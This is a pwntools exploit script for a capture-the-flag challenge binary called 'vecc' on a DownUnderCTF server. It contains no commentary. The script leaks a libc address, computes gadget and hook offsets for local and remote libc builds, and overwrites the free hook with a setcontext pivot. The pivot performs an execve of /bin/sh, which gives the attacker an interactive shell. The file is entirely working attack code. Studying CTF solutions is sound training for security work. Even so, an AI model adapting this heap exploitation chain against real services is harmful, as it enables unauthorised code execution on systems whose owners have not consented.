from pwn import *
context.arch = 'amd64'

TARGET = './vecc'
HOST = 'chal.duc.tf'
PORT = 30007

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def add(idx):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', str(idx))

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(idx))

def append(idx, size, data):
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', str(idx))
    r.sendlineafter('> ', str(size))
    r.sendline(data)

def clear(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('> ', str(idx))

def show(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('> ', str(idx))

r = start()

add(0)
append(0, 0x410, 'A'*0x40e)
add(1)
show(1)
leak = u64(r.recv(8))


dbg('leak')
base = leak - 0x3ec080
dbg('base')
fh = base + 0x3ed8e8
system = base + 0x4f4e0
setcontext = base + 0x52145
target = base + 0x3ec0a0

rdx = base + 0x00130866
rax = base + 0x0010fedc
syscall = base + 0x001160df
binsh = base + 0x1b40fa

if args.R:
    fh = base + 0x3eaee8
    system = base + 0x4f440
    setcontext = base + 0x520a5
    binsh = base + 0x1b3e9a
    rdx = base + 0x1306b6
    rax = base + 0x10fdcc
    syscall = base + 0x122025

rdi = 0x00400e73
r.recvuntil('0: exit\n1: create vecc\n2: destroy vecc\n3: append vecc\n4: clear vecc\n5: show vecc')
context.log_level = 'debug'

clear(1)

payload = ''
payload += '\x01' * 7
payload += '\x00' * 8
payload += p64(target+0x20)
payload += flat(0x111, 0x222, 0x333, 0x3b, syscall, 0x666, 0x777, 0x888, 0x99)
payload += flat(0x1111, binsh, 0, 0x44444, 0x55555, 0, 0x777, 0x888, target+0x20)
payload += flat(rax)

payload = payload.ljust(0x1857, '\x00')
payload += p64(setcontext)
if args.D:
    debug(r, [0xbb3])

append(1, 0x1860, payload)

r.interactive()
r.close()
